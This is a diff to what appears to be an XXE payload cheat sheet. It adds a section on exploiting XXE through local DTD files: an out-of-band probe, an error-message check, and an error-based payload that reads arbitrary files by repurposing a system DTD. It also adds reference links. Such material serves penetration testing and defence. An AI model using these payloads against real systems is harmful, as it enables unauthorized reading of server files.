@@ -288,6 +288,47 @@ Send the XML file to the `deploy` folder.
 
 Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
 
+
+## XXE with local DTD
+
+In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:
+```xml
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'>]>
+<root>&test;</root>
+```
+
+If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.
+
+```xml
+<!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
+
+    %local_dtd;
+]>
+<root></root>
+```
+
+Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.
+
+```xml
+<!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+
+    <!ENTITY % ISOamsa '
+        <!ENTITY &#x25; file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<root></root>
+```
+
+[Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
+
+
 ## XXE in exotic files
 
 ### XXE inside SVG
@@ -341,6 +382,7 @@ JPG (experimental)
 GIF (experimental)
 ```
 
+
 ## References
 
 * [XML External Entity (XXE) Processing - OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
@@ -360,3 +402,4 @@ GIF (experimental)
 * [Pentest XXE - @phonexicum](https://phonexicum.github.io/infosec/xxe.html)
 * [Exploiting XXE with local DTD files - Arseniy Sharoglazov - 12/12/2018](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
 * [Web Security Academy >> XML external entity (XXE) injection - 2019 PortSwigger Ltd](https://portswigger.net/web-security/xxe)
+- [Automating local DTD discovery for XXE exploitation - July 16 2019 by Philippe Arteau](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation)
